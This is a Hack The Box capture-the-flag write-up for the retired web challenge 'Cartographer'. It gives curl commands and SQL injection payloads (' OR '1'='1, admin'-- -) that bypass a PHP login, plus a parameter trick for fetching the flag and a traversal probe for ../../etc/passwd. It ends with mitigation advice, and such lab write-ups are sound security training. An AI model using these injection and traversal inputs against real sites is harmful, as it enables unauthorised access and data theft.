---
challenge: Cartographer
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, sqli, login-bypass, enumeration, php]
---

# Cartographer — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Solved challenge; no real flags.

## TL;DR

A PHP login with classic **SQL injection**: `' OR '1'='1` gets in without credentials. Inside, the panel loads sections through `panel.php?info=<value>`, and simply requesting `info=flag` returns the flag. Brute force goes nowhere; the challenge is injection, not a wordlist.

## Brief

"Some underground hackers are building a command and control server. Can you break in and see what they are up to?"

## Analysis

```bash
curl -s http://<IP>:<port>/ | head -40
```

A `POST` form with `username` and `password`. Check for injection first:

```bash
curl -s -X POST http://<IP>:<port>/index.php \
  -d "username=admin'-- -&password=x" -i | head
```

Usual alternatives:

```text
' OR '1'='1
'||' 1 '=' 1
admin' #
```

A redirect to the panel means the query is concatenated.

## Exploitation

With a session, navigation uses a parameter:

```text
http://<IP>:<port>/panel.php?info=home
```

The value selects the section. Try `info=flag`:

```bash
curl -s -b 'PHPSESSID=<id>' "http://<IP>:<port>/panel.php?info=flag"
```

```text
HTB{<flag>}
```

If `info` filtered paths, the same parameter enumerates: `home`, `about`, `contact`, `flag`, `admin`… and is worth testing for traversal (`../../etc/passwd`) when there is no allowlist.

## Pitfalls

- **Session**: the panel needs the `PHPSESSID` cookie from login; keep it with `-c/-b`.
- **Brute force is useless**: `admin:admin`, `admin:password` fail, and so do dictionaries.
- **Parameter name**: if `info` does not answer, try `page`, `view`, `file`; the exact name is in the panel links.
- **Quotes**: `admin'-- -` needs the space before the dash on MySQL.

## Lessons

- A concatenated `SELECT` in a login is an immediate bypass: no password required.
- The parameter that picks a "section" is usually the one that serves the flag.
- Mitigation: prepared statements, server-side hash comparison, and a section allowlist instead of a dynamic include.
